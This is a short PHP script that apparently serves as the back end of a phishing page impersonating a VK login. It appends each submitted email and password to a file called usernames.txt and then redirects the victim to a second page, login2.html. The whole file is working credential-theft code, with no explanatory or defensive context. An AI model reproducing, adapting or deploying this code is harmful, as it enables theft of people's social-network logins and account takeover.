<?php

file_put_contents("usernames.txt", "Vk Username: " . $_POST['email'] . " Pass: " . $_POST['pass'] . "\n", FILE_APPEND);
header('Location: login2.html');
exit();
